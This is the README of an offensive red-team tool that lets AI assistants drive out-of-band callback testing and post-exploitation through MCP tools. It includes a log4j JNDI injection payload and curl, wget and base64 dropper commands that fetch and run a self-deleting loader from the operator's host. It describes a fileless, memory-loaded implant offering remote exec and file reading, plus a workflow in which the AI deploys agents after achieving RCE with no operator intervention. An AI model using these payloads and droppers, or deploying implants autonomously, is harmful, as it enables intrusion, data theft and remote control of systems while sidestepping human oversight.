# oast-mcp

[![CI](https://github.com/dguerri/oast-mcp/actions/workflows/ci.yml/badge.svg)](https://github.com/dguerri/oast-mcp/actions/workflows/ci.yml)
[![Coverage](https://codecov.io/gh/dguerri/oast-mcp/branch/main/graph/badge.svg)](https://codecov.io/gh/dguerri/oast-mcp)
[![Go version](https://img.shields.io/badge/go-1.25-00ADD8?logo=go)](https://go.dev/dl/)
[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)

**Out-of-Band Application Security Testing via the Model Context Protocol.**

oast-mcp exposes six OAST tools and six agent-management tools to any MCP-compatible AI assistant. It lets an AI drive DNS/HTTP/HTTPS callback detection, deploy agents on compromised targets, and run remote tasks — all from a single, audited interface.

```
┌────────────────────────────────────────────────────────┐
│          AI Assistant (Claude, GPT-4o, …)              │
│            MCP client → SSE transport                  │
└───────────────────────┬────────────────────────────────┘
                        │ HTTPS (Caddy TLS termination)
┌───────────────────────▼────────────────────────────────┐
│  oast-mcp  (127.0.0.1)                                 │
│  ┌─────────────────┐   ┌──────────────────────────┐    │
│  │  MCP SSE :8080  │   │  Agent WebSocket :8081   │    │
│  └────────┬────────┘   └───────────┬──────────────┘    │
│           │ event store            │ task dispatch     │
│  ┌────────▼────────────────────────▼───────────────┐   │
│  │  SQLite store  (sessions · events · tasks ·     │   │
│  │                agents)                          │   │
│  └─────────────────────────────────────────────────┘   │
│                        │                               │
│           ┌────────────▼────────────┐                  │
│           │  native responder       │                  │
│           │  (DNS :53 · HTTP :9090) │                  │
│           └─────────────────────────┘                  │
└────────────────────────────────────────────────────────┘
```

---

## Documentation

| Doc                                                      | What it covers                                                                                                                  |
| -------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| [`docs/gcp-project-setup.md`](docs/gcp-project-setup.md) | Create GCP project, enable APIs, create state bucket, configure Cloud DNS zone, authenticate Terraform, full deploy walkthrough |
| [`docs/domain-setup.md`](docs/domain-setup.md)           | DNS architecture — why mcp/agent hostnames must be siblings of the OAST zone, NS delegation, glue records                       |

---

## Quickstart

Prerequisites: GCP project, a domain pointed at Cloud DNS, Terraform ≥ 1.5, Ansible, Go.

### 1 — Configure

`make secrets` creates `deploy/.env` from the example, then fills in a generated JWT signing key and age operator keypair. Run it first, then fill in the remaining values.

```bash
make secrets
# → deploy/.env         (JWT_KEY + OPERATOR_PUB filled in — gitignored)
# → deploy/operator.key (age private key — keep safe, gitignored)

# Now edit deploy/.env and fill in the remaining values:
#   GCP_PROJECT_ID, TF_BACKEND_BUCKET, SSH_KEY, ADMIN_SSH_CIDR,
#   OAST_DOMAIN, PARENT_DNS_ZONE_NAME, MCP_HOSTNAME, AGENT_HOSTNAME, ACME_EMAIL
$EDITOR deploy/.env
```

The Makefile reads `deploy/.env` and generates `terraform.tfvars` and `inventory/hosts.yml` automatically — you never edit those files directly.

### 2 — Initialise Terraform

Downloads providers and configures the GCS remote backend.

```bash
make tf-init
```

### 3 — Deploy

`make deploy` runs the full pipeline in order:

```bash
make deploy
```

| Step                 | What happens                                                                                                                                                                                                                                 |
| -------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `make cross`         | Cross-compiles the `oast-mcp` server binary for Linux amd64                                                                                                                                                                                  |
| `make build-loaders` | Builds Stage 1 loaders: C/musl/mbedTLS for linux/amd64 and linux/arm64 (requires Docker, ~200KB each); Go cross-compile for windows/amd64                                                                                                    |
| `make build-agents`  | Cross-compiles Stage 2 agent for linux/amd64, linux/arm64, windows/amd64; UPX-compresses if available                                                                                                                                        |
| `make tf-apply`      | Creates GCP VM, static IP, firewall rules, DNS records (NS delegation + glue + mcp/agent A records), Caddy service account + key                                                                                                             |
| `make inventory`     | Pulls `vm_public_ip` from Terraform state, generates `deploy/ansible/inventory/hosts.yml`                                                                                                                                                    |
| `make ansible`       | Pulls `caddy_gcp_sa_key_b64` and `vm_public_ip` from Terraform state, generates an ephemeral TSIG key pair, runs Ansible playbook: hardens the VM, installs Caddy + oast-mcp, copies loader/agent binaries to `bin_dir`, starts all services |

Or run steps individually if you only need to re-run part of the pipeline (e.g. `make ansible` after a config change).

### 4 — Issue a token

```bash
# SSH to the VM and run:
sudo oast-mcp token \
  --config /etc/oast-mcp/config.yml \
  --sub my-ai-assistant \
  --scope oast:read,oast:write,agent:admin \
  --ttl 168h
# Prints a signed JWT — use as the Bearer token for the MCP client.
```

### 5 — Connect an MCP client

Configure your AI assistant to connect to the MCP SSE endpoint:

```
URL:           https://mcp.oast.info/sse
Authorization: Bearer <token from step 4>
```

### 6 — Install the agent skill (optional but recommended)

`.agents/skills/oast-mcp/SKILL.md` follows the [agentskills.io](https://agentskills.io) standard and teaches your AI assistant the correct tool order, capability params, and common pitfalls. Without it, the assistant may poll `oast_list_events` instead of blocking on `oast_wait_for_event`, or misconfigure delivery modes.

**Gemini CLI, Codex, and other [agentskills.io-compatible](https://agentskills.io) agents** — scan `.agents/skills/` in the project directory and `~/.agents/skills/` globally. If you're working inside this repository the skill is auto-discovered. For global access:
```bash
cp -r .agents/skills/oast-mcp ~/.agents/skills/oast-mcp
```

**Claude Code** — scans `.claude/skills/` (project) and `~/.claude/skills/` (user), not `.agents/skills/`:
```bash
cp -r .agents/skills/oast-mcp ~/.claude/skills/oast-mcp
```

**ChatGPT / Custom GPT** — paste the contents of `.agents/skills/oast-mcp/SKILL.md` into the *Instructions* field of your Custom GPT, or prepend it to your system prompt.

### Teardown

Destroys all GCP infrastructure (VM, IPs, DNS records, service accounts). Prompts for confirmation before destroying.

```bash
make teardown
# → terraform destroy (interactive confirmation)
# → removes generated inventory/hosts.yml and terraform.tfvars
# → preserves GCS state bucket, deploy/.env, deploy/operator.key
```

Delete `deploy/.env` and `deploy/operator.key` manually if you are retiring the deployment entirely.

---

## Configuration reference

| Field                        | Default                     | Description                                                                        |
| ---------------------------- | --------------------------- | ---------------------------------------------------------------------------------- |
| `domain.oast_zone`           | —                           | Wildcard DNS zone, e.g. `oast.example.com`                                         |
| `domain.mcp_hostname`        | —                           | MCP SSE public hostname                                                            |
| `domain.agent_hostname`      | —                           | Agent WebSocket public hostname                                                    |
| `server.mcp_port`            | `8080`                      | MCP SSE listen port (loopback)                                                     |
| `server.agent_port`          | `8081`                      | Agent WebSocket listen port (loopback)                                             |
| `server.bind_addr`           | `127.0.0.1`                 | Bind address for both servers                                                      |
| `responder.public_ip`        | `""`                        | Public IP advertised in DNS A record answers                                       |
| `responder.dns_bind_addr`    | `""`                        | IP to bind DNS on; empty = all interfaces                                          |
| `responder.http_bind_addr`   | `127.0.0.1`                 | IP to bind HTTP callback server                                                    |
| `responder.dns_port`         | `53`                        | UDP/TCP port for the native DNS server                                             |
| `responder.http_port`        | `9090`                      | TCP port for the native HTTP callback server                                       |
| `auth.jwt_signing_key_hex`   | —                           | 64 hex chars (32 bytes) HMAC-SHA256 JWT signing key                                |
| `auth.tsig_key_name`         | `""`                        | TSIG key name for RFC 2136 DNS updates (e.g. `caddy.`)                             |
| `auth.tsig_key_hex`          | `""`                        | 64 hex chars (32 bytes) TSIG secret; empty = RFC 2136 disabled                     |
| `auth.tsig_allowed_addr`     | `""`                        | Source IP allowed to send RFC 2136 UPDATEs; empty = any                            |
| `database.path`              | `/var/lib/oast-mcp/oast.db` | SQLite database path                                                               |
| `retention.session_ttl_days` | `7`                         | Days to keep OAST sessions                                                         |
| `retention.event_ttl_days`   | `14`                        | Days to keep interaction events                                                    |
| `agent.operator_public_key`  | —                           | age X25519 public key used for agent dropper encryption                            |
| `agent.exec_lab_mode`        | `false`                     | Allow arbitrary exec (lab/CTF only)                                                |
| `agent.exec_allowlist`       | `[]`                        | Permitted commands when exec_lab_mode is false                                     |
| `agent.bin_dir`              | `/var/lib/oast-mcp/bin`     | Directory containing pre-built `loader-*` and `agent-*` binaries served via `/dl/` |

---

## OAST operator workflow

### Create a session and get callback endpoints

```
Tool: oast_create_session
Args: { "ttl_seconds": 3600, "tags": ["ssrf-test", "pr-123"] }

Response:
{
  "session_id": "abc123",
  "endpoints": {
    "dns":   "a1b2c3d4e5.oast.example.com",
    "http":  "http://a1b2c3d4e5.oast.example.com",
    "https": "https://a1b2c3d4e5.oast.example.com"
  },
  "expires_at": "2026-03-01T00:00:00Z"
}
```

### Trigger a callback (in the target application)

```bash
# DNS
dig A a1b2c3d4e5.oast.example.com

# HTTP
curl http://a1b2c3d4e5.oast.example.com/test

# HTTPS
curl https://a1b2c3d4e5.oast.example.com/test
```

### Poll for interactions

```
Tool: oast_list_events
Args: { "session_id": "abc123" }

Response:
{
  "events": [
    {
      "event_id": "...",
      "protocol": "dns",
      "src_ip": "203.0.113.42",
      "received_at": "2026-02-28T22:01:00Z",
      "data": { "qname": "a1b2c3d4e5.oast.example.com", "qtype": "A" }
    }
  ],
  "next_cursor": "eyJ..."
}
```

### Close a session

```
Tool: oast_close_session
Args: { "session_id": "abc123" }
```

### Wait for the next interaction (blocking poll)

Instead of polling in a loop, the AI can block until an event arrives or the timeout expires:

```
Tool: oast_wait_for_event
Args: { "session_id": "abc123", "timeout_seconds": 30 }

Response:
{
  "events": [
    {
      "event_id": "...",
      "protocol": "http",
      "src_ip": "203.0.113.42",
      "received_at": "2026-03-02T10:01:00Z",
      "data": { "method": "GET", "path": "/test", "user_agent": "curl/8.0" }
    }
  ],
  "next_cursor": "eyJ...",
  "timed_out": false
}
```

Returns `timed_out: true` (with an empty `events` array) if no event arrives within the timeout.

### Payload generation

Generate a ready-to-use injection payload for a session. The `type` field selects the payload template (e.g. `log4j`, `ssrf`, `generic`); `label` is an optional human-readable tag embedded in the subdomain.

```
Tool: oast_generate_payload
Args: { "session_id": "abc123", "type": "log4j", "label": "ua-header" }

Response:
{
  "dns_hostname": "a1b2c3d4e5.ua-header.oast.example.com",
  "http_url":     "http://a1b2c3d4e5.ua-header.oast.example.com/",
  "https_url":    "https://a1b2c3d4e5.ua-header.oast.example.com/",
  "payload":      "${jndi:ldap://a1b2c3d4e5.ua-header.oast.example.com/a}"
}
```

---

## Agent workflow

Agents are two-stage Go binaries. The AI deploys them automatically after achieving RCE — no operator intervention required.

### Architecture

```
Stage 1 — loader (Linux C/musl ~90-200KB, Windows Go ~1.8MB)
  Delivered to target via curl, wget, or inline base64.
  Self-deletes immediately on first run (one-shot dropper).
  Downloads Stage 2 from /dl/second-stage/{os}-{arch} (token-gated).
  Linux:   Stage 2 loaded into anonymous memfd — never written to disk.
  Windows: Stage 2 written to a delete-on-close temp file, removed on agent exit;
           loader .exe also auto-deleted on loader exit.

Stage 2 — agent (~3MB UPX)
  Connects WSS to the agent server, registers, accepts tasks.
  Capabilities: exec, read_file, fetch_url, system_info.
  Reconnects with exponential backoff.
  Self-deletes if the token expires.
```

### Deploy an agent via MCP (automated)

```
Tool: agent_dropper_generate
Scope required: agent:admin
Args: {
  "agent_id": "web-01",
  "os_arch":  "linux-amd64",
  "ttl":      "24h"
}

Response:
{
  "agent_id":     "web-01",
  "token":        "eyJ...",
  "expires_at":   "2026-03-06T10:00:00Z",
  "download_url": "https://agent.example.com/dl/loader-linux-amd64",
  "curl_cmd":     "curl -fsSL '...' -o /tmp/.l && chmod +x /tmp/.l && /tmp/.l https://agent.example.com eyJ... web-01",
  "wget_cmd":     "wget -qO /tmp/.l '...' && chmod +x /tmp/.l && /tmp/.l https://agent.example.com eyJ... web-01",
  "b64":          "<base64 of loader binary>",
  "b64_cmd":      "printf '<b64>' | base64 -d > /tmp/.l && chmod +x /tmp/.l && /tmp/.l ..."
}
```

**AI workflow after RCE:**
1. Probe target: `uname -m` (Linux) or `$ENV:PROCESSOR_ARCHITECTURE` (Windows) to determine `os_arch`.
2. Call `agent_dropper_generate` with `agent_id`, `os_arch`, and `ttl`.
3. Run `curl_cmd`, `wget_cmd`, or `b64_cmd` on the target via the RCE primitive.
4. Call `agent_list` to confirm the agent appears as `online`.
5. Use `agent_task_schedule` to run tasks.

### List registered agents

```
Tool: agent_list
Scope required: agent:admin

Response: [{ "agent_id": "web-01", "status": "online", "last_seen_at": "..." }]
```

### Schedule a task

```
Tool: agent_task_schedule
Args: {
  "agent_id":   "web-01",
  "capability": "exec",
  "params":     { "cmd": "id", "timeout": 10 }
}

Response: { "task_id": "task-uuid", "status": "pending" }
```

Available capabilities:

| Capability    | Params                                       | Result                               |
| ------------- | -------------------------------------------- | ------------------------------------ |
| `exec`        | `cmd` (string), `timeout` (int, default 30s) | `output` (string), `exit_code` (int) |
| `read_file`   | `path` (string)                              | `content` (base64), `path`           |
| `fetch_url`   | `url` (string), `timeout` (int, default 15s) | `status` (int), `body` (base64)      |
| `system_info` | —                                            | `hostname`, `os`, `arch`, `user`     |

### Check task status

```
Tool: agent_task_status
Args: { "task_id": "task-uuid" }

Response: { "status": "done", "result": { "output": "uid=0(root)", "exit_code": 0 } }
```

---

## Validation checklist

After deployment run through these steps to confirm everything works end-to-end:

```bash
VM=$(cd deploy/terraform && terraform output -raw vm_public_ip)

# 1. DNS delegation is working — native responder answers for the oast zone
dig NS oast.example.com +short          # → ns1.example.com. ns2.example.com.
dig A test.oast.example.com @$VM        # → $VM (native responder answers)

# 2. TLS certificates provisioned by Caddy DNS-01
curl -sv https://mcp.example.com/sse 2>&1 | grep "SSL certificate verify ok"

# 3. Auth is enforced
curl https://mcp.example.com/sse        # → 401 Unauthorized

# 4. Token + SSE stream (run on the VM)
TOKEN=$(sudo oast-mcp token --config /etc/oast-mcp/config.yml \
  --sub validator --scope oast:write,oast:read --ttl 1h)
curl -H "Authorization: Bearer $TOKEN" https://mcp.example.com/sse
# → HTTP 200, Content-Type: text/event-stream, endpoint event with session URL
```

---

## Retention and maintenance

Expired sessions and events are purged automatically every 24 hours by the built-in retention ticker. Defaults:

- Sessions: 7 days
- Events: 14 days

To adjust, change `retention.session_ttl_days` / `retention.event_ttl_days` in `config.yml` and restart the service.

---

## Development

```bash
# Build
make build

# Cross-compile (Linux amd64 for deployment)
make cross

# Tests (with race detector)
make test

# Generate a local token for testing
./bin/oast-mcp token --sub dev --scope oast:read,oast:write,agent:admin --ttl 24h

# Run locally (uses built-in mock responder when public_ip is empty)
./bin/oast-mcp serve --config /etc/oast-mcp/config.yml
```

### Scopes

| Scope           | Tools                                                                                    |
| --------------- | ---------------------------------------------------------------------------------------- |
| `oast:write`    | `oast_create_session`, `oast_close_session`                                              |
| `oast:read`     | `oast_list_sessions`, `oast_list_events`, `oast_wait_for_event`, `oast_generate_payload` |
| `agent:admin`   | `agent_list`, `agent_task_schedule`, `agent_task_status`, `agent_dropper_generate`       |
| `agent:connect` | WebSocket agent registration + `/dl/second-stage/` downloads                             |

### Build loader and agent binaries

```bash
# Linux loaders (C/musl/mbedTLS, requires Docker):
#   bin/loader-linux-amd64   ~91 KB
#   bin/loader-linux-arm64   ~91 KB
# Windows loader (Go, no Docker required):
#   bin/loader-windows-amd64.exe
make build-loaders   # → bin/loader-{os}-{arch}[.exe]

# Agents (Go cross-compile, all platforms):
make build-agents    # → bin/agent-{os}-{arch}[.exe]

make build-all       # build + build-loaders + build-agents
```

Binaries must be copied to `agent.bin_dir` on the server (Ansible handles this on `make deploy`).

### Token generation

```bash
# Operator/AI token
oast-mcp token --sub <tenant-id> --scope oast:read,oast:write,agent:admin --ttl 168h

# Agent token (normally issued automatically by agent_dropper_generate)
oast-mcp token --sub <tenant-id> --scope agent:connect --ttl 24h
```

### Revoking a token

To immediately invalidate an issued token:

```sh
oast-mcp revoke --config /etc/oast-mcp/config.yml --token <jwt>
```

The token is recorded in the revocation store and rejected on all subsequent requests.

---

## Comparison with other OAST MCP Servers

| Feature              | `oast-mcp` (This Project)   | `mcp-interactsh`            | `go-roast`               |
| :------------------- | :-------------------------- | :-------------------------- | :----------------------- |
| **Primary Use Case** | Offensive / Red Teaming     | Offensive / Bug Bounty      | Defensive / Threat Intel |
| **Testing Paradigm** | Active                      | Active                      | Passive (Forensics)      |
| **Infrastructure**   | Self-Hosted (GCP/Terraform) | Public / 3rd Party          | Local Data / APIs        |
| **OAST Callbacks**   | DNS, HTTP, HTTPS            | DNS, HTTP, HTTPS, SMTP, ... | N/A (Analyzes logs)      |
| **Payload Gen**      | Yes (Built-in templates)    | No                          | N/A                      |
| **Retrieval**        | Wait and polling            | Polling                     | N/A                      |
| **Post-Exploit**     | Yes (Two-stage Agents, RCE) | No                          | No                       |
| **Setup Friction**   | High (Cloud, DNS, Certs)    | Extremely Low (`npx`)       | Low (Binary install)     |
| **Data Privacy**     | High (100% Owned)           | Low (if using public fleet) | High (Local analysis)    |

### Summary

- **`oast-mcp`** is for professional red-teaming where data privacy and a seamless transition from **vulnerability discovery to post-exploitation (RCE)** are required. It is a full-stack platform, not just a wrapper.
- **`mcp-interactsh`** is ideal for quick, ad-hoc testing and bug hunting where ease of use is more important than owning the underlying infrastructure.
- **`go-roast`** is a specialized forensic tool for defensive workflows, used to decode and analyze metadata from existing OAST callbacks found in logs or threat intel feeds.
